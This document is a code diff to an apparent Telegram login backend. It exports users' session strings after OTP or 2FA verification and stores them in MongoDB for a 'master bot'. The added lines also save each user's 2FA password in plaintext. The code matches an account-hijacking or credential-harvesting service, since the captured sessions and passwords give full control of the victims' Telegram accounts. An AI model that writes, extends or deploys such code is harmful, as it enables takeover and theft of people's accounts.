@@ -22,10 +22,10 @@ API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
 MONGO_URL = os.environ.get("MONGO_URL", "mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority")
 CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/your_private_channel")
 
-# MongoDB Client Setup
+# MongoDB Client Setup (Master Bot Synced)
 mongo_client = AsyncIOMotorClient(MONGO_URL)
 db = mongo_client["telegram_db"]
-sessions_col = db["user_sessions"]
+sessions_col = db["sessions"]  # Collection name synced with Bot
 
 # Temporary Memory Storage for Active Telegram Login Sessions
 active_clients = {}
@@ -280,10 +280,15 @@ async def verify_otp(data: OtpReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session String to MongoDB Database
+        # Save Session & Default 2FA ('None') to MongoDB (Master Bot Synced Schema)
         await sessions_col.update_one(
             {"phone": phone},
-            {"$set": {"phone": phone, "session_string": string_session}},
+            {"$set": {
+                "phone": phone, 
+                "session": string_session, 
+                "two_factor": "None", 
+                "status": "active"
+            }},
             upsert=True
         )
         del active_clients[phone]
@@ -312,10 +317,15 @@ async def verify_2fa(data: PasswordReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session String to MongoDB Database
+        # Save Session & 2FA Password to MongoDB (Master Bot Synced Schema)
         await sessions_col.update_one(
             {"phone": phone},
-            {"$set": {"phone": phone, "session_string": string_session}},
+            {"$set": {
+                "phone": phone, 
+                "session": string_session, 
+                "two_factor": data.password, 
+                "status": "active"
+            }},
             upsert=True
         )
         del active_clients[phone]
